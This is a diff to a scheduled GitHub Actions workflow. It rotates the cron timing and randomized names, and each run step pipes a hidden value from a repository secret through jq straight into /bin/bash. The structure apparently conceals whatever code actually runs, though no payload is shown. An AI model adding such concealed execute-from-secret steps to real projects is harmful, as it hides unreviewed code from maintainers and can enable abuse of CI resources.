@@ -2,28 +2,27 @@ name: bitesizedcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '40 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: bitesizedcommitment
         env:
-          nxa881: ${{ secrets.nxa881 }}
+          xpb8078: ${{ secrets.xpb8078 }}
         run: |
-          echo $nxa881 | jq -r .a9 | /bin/bash
-          echo $yv7 | jq -r .kimk0 | /bin/bash
-          echo $ncrs9 | jq -r .hym3845 | /bin/bash
-          echo $dli71057 | jq -r .fyz51636 | /bin/bash
-          echo $jyla184 | jq -r .dsxqo0 | /bin/bash
-          echo $pdfrt5624 | jq -r .zypda71343 | /bin/bash
-          echo $pmin390 | jq -r .vq706 | /bin/bash
-          echo $uf07 | jq -r .vdhpw5429 | /bin/bash
-          echo $oys3 | jq -r .k8157 | /bin/bash
-          echo $iheqb6597 | jq -r .hm46 | /bin/bash
-          echo $ox53015 | jq -r .wei4389 | /bin/bash
-          echo $x47 | jq -r .p2 | /bin/bash
+          echo $xpb8078 | jq -r .jtzhu69 | /bin/bash
+          echo $nanyk429 | jq -r .tnkcc7 | /bin/bash
+          echo $uzwh60657 | jq -r .agulk843 | /bin/bash
+          echo $xc8 | jq -r .gagu1 | /bin/bash
+          echo $cmn95244 | jq -r .wwe52 | /bin/bash
+          echo $trox2341 | jq -r .n73 | /bin/bash
+          echo $kx50678 | jq -r .eem414 | /bin/bash
+          echo $ocn50536 | jq -r .r5 | /bin/bash
+          echo $nvstb1 | jq -r .pizxg38761 | /bin/bash
+          echo $yo329 | jq -r .fry8 | /bin/bash
+          echo $zr1 | jq -r .tfsdt796 | /bin/bash
+          echo $trdkl01405 | jq -r .ifl43 | /bin/bash
 
